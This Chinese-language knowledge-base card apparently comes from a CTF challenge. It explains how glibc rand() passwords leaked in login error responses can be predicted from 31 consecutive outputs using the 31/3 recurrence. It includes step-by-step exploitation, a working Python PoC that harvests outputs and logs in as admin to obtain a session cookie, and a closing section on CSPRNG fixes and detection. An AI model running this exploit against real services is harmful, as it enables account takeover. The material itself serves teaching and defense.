---
id: crypto-prng-glibc-rand-output-sequence-prediction
title: glibc rand() 连续输出泄露预测下一轮：31/3 线性递推恢复登录密码
type: scenario
domain: crypto
path: crypto/prng
technique: glibc-rand-output-sequence-prediction
tags:
- prng
- glibc
- rand
- prediction
- authentication
- session
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:42:55+08:00'
  notes: 已对照原文与相关图核对：srand(time^pid) 一次播种、/login 每次 rand() 生成密码并经 snprintf 回显 16 字节 username 后的数字；31/3 递推 o[n+1]=(o[n-30]+o[n-2]+eps) mod 2^31、Python outputs[-31]+outputs[-3]、base/base+1 两候选与原文 AI 推导及 exp 一致；session 恢复后访问 /reward、/pwn。未设 affected_versions（glibc 行为，原文无版本区间）；frontmatter无sources/source_url。
url: /docs/crypto/prng/crypto-prng-glibc-rand-output-sequence-prediction/
draft: false
kb_aliases:
- glibc rand 预测
- rand() 输出序列恢复
- 31/3 taps
- 登录密码预测
- 随机数回显泄露
- NCTF 最后的一舞
---

## 一句话结论

当 Web 登录接口把 `rand()` 生成的密码随错误响应回显（例如 username 前缀 + 当前密码数字），攻击者可以连续收集 ≥31 个输出，利用 glibc `rand()` 的 31/3 加法反馈递推 `o[n+1] ≈ (o[n-30] + o[n-2]) mod 2^31` 预测下一轮密码；由于输出右移丢 1 bit，下一值只有 `base`/`base+1` 两个候选，两个都试即可登录管理员并拿到 session，继续访问受保护的 `/pwn` worker。

## 原理

- glibc 的 `rand()` 使用非线性加法反馈生成器（TYPE_3：degree 31、separation 3）。对连续输出 `o[0..n]`，下一个输出满足：
  ```text
  o[n+1] = (o[n-30] + o[n-2] + eps) mod 2^31，eps ∈ {0,1}
  ```
  等价于 Python 负索引的 `base = (outputs[-31] + outputs[-3]) & 0x7fffffff`，候选为 `base` 和 `(base+1) & 0x7fffffff`。
- 为什么有 `eps`：内部状态是 32 位，`rand()` 返回时做了 `>> 1`（丢弃最低 1 bit），所以外部只能把下一次输出缩到两个候选；多试一次即可。
- 样本的密码生成：`srand(time(0) ^ getpid())`，每次 `/login` 调用 `rand()` 生成数字密码并 `snprintf("%d")`；登录失败时 `snprintf(session_bytes, ..., aS, &v27)` 把 username 前缀和密码一起输出，攻击者用 16 字节 username 作为标记，正则提取后续数字。
- 攻击者不需要知道种子（time^pid），只需 ≥31 个连续输出；收集可以通过重复请求 `/login`（每次生成新密码并回显）完成。
- 登录成功后服务端返回 `Set-Cookie: session=<32 hex>`；带 admin session 才能访问 `/reward`（泄露 PIE 指针）和 `/pwn?key=...`（要求 `root.mys` 中的 key）。
- 该手法与“时间种子爆破”不同：不猜种子，而是从输出序列反推内部状态；适用于种子不可预测但输出可泄露的 PRNG。
- 边界：如果每次请求重新 `srand` 且输出不连续、或输出被截断/扰动、或使用 CSPRNG，则递推失效；需要至少 31 个连续值，且实现与 glibc 一致。

## 触发条件

- 目标使用 glibc `rand()` 生成安全敏感值（密码、验证码、token），并把连续输出以某种形式泄露给攻击者。
- 攻击者能触发足够多次生成（≥31）并读取对应输出；输出没有被额外随机化/截断。
- 登录接口接受用户名/密码，密码可预测；会话 cookie 可被复用；受保护接口只校验 session。
- 目标 libc 的 `rand()` 算法与 glibc 一致（Linux glibc）；其他 libc/语言需重新确认递推参数。
- 没有严格的登录速率限制/验证码，否则收集 31 个输出可能受阻（可分布式/低速规避）。

## 利用步骤

1. 观察 `/login` 失败响应：构造 16 字节 username（如 `A`*16），服务端回显中会带出本次 `rand()` 密码数字；用正则提取。
2. 重复请求，收集至少 31 个连续输出 `outputs`；记录顺序，避免并发请求打乱序列。
3. 计算 `base = (outputs[-31] + outputs[-3]) & 0x7fffffff`，候选 `base`、`base+1`。
4. 用 `username=admin&password=<candidate>` 尝试登录；成功则从 `Set-Cookie: session=...` 取 session。
5. 带 session 访问受保护接口：`POST /reward` body `Win` 泄露 PIE 地址；通过下载/镜像读取 `root.mys` 中的 key；`GET /pwn?key=<key>` 升级为 raw stream，进入 `pwn_worker`。
6. 在 worker 中发送受限 shellcode（见关联卡）获取 shell，读取 flag。
7. 若两个候选都失败，检查是否输出序列有缺失/乱序、是否有其他请求消耗了 `rand()`、是否 libc 算法不同；可多收集几个输出重新计算。

## PoC

```python
import re, time, socket
from urllib.parse import quote

def leak_one(host, port):
    body = b'username=' + b'A'*16 + b'&password=x'
    req = (f'POST /login HTTP/1.1\r\nHost: {host}:{port}\r\n'
           f'Content-Type: application/x-www-form-urlencoded\r\n'
           f'Content-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode() + body
    s = socket.create_connection((host, port), timeout=3)
    s.sendall(req)
    data = b''
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    m = re.search(rb'A{16}(\d+)', data)
    if not m:
        raise RuntimeError(data[:200])
    return int(m.group(1))

def predict_next(outputs):
    assert len(outputs) >= 31
    base = (outputs[-31] + outputs[-3]) & 0x7fffffff
    return base, (base + 1) & 0x7fffffff

def recover_session(host, port, rounds=8):
    for _ in range(rounds):
        outs = [leak_one(host, port) for _ in range(40)]
        for cand in predict_next(outs):
            body = f'username=admin&password={quote(str(cand), safe="")}'.encode()
            req = (f'POST /login HTTP/1.1\r\nHost: {host}:{port}\r\n'
                   f'Content-Type: application/x-www-form-urlencoded\r\n'
                   f'Content-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode() + body
            s = socket.create_connection((host, port), timeout=3)
            s.sendall(req)
            resp = b''
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
            s.close()
            m = re.search(rb'Set-Cookie: session=([0-9a-fA-F]{32})', resp)
            if m:
                return m.group(1).decode()
    raise RuntimeError('login failed')
```

```text
# 递推核心：
# o[n+1] = (o[n-30] + o[n-2] + eps) mod 2^31
# Python: base = (outputs[-31] + outputs[-3]) & 0x7fffffff
# 候选: base, (base + 1) & 0x7fffffff
```

## 变体与关联

- **变体：时间种子**：若无法泄露输出但知道 `srand(time(NULL))`，可直接复现序列（见 [[crypto-prng-srand-time-seed-2fa-code-prediction]]）。
- **变体：MT19937/PHP/Java**：不同 PRNG 的递推/状态恢复方式不同；MT19937 需 624 个 32 位输出，`Math.random`/V8 用 XorShift128+。
- **变体：输出泄露点**：错误消息、日志、调试接口、邮件/短信验证码、API 返回的 token；任何把 PRNG 输出带出的地方都可尝试。
- **关联卡片**：[[binary-pwn-sandbox-escape-xmm7-residual-libc-24byte-shellcode]]（登录后 pwn_worker 的受限 shellcode）、[[crypto-prng-math-random-sharekey-recovery]]（另一类 PRNG 密钥恢复）。
- **边界**：需要 ≥31 个连续输出；并发/其他请求会破坏序列；若每次 `srand` 重播种或输出经过哈希/加密，递推失效；glibc 版本差异可能影响递推参数。

## 检测与防御

- **修复**：密码/验证码/token 使用 CSPRNG（`getrandom`、`/dev/urandom`、`RAND_bytes`）；不要用 `rand()` 生成安全敏感值。
- **防泄露**：错误响应不要回显随机密码/内部状态；日志脱敏；调试接口下线。
- **会话**：登录失败限制速率、增加验证码/延迟；session 绑定用户/IP/设备并设置短有效期；敏感操作二次认证。
- **检测**：监控同一 IP 短时间内大量 `/login` 失败、响应体包含长数字、随后成功登录；检测异常 session 复用/受保护接口访问。
